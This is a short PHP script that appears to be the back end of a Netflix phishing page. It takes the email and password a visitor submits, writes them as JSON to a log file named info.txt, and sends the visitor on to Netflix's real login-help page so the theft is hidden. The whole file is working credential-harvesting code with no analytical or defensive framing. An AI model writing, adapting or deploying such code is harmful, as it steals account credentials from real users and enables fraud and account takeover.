<?php

header('Location: https://www.netflix.com/us/LoginHelp');
$data = array('site' => 'NetFlix',
  'user' => $_POST['email'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>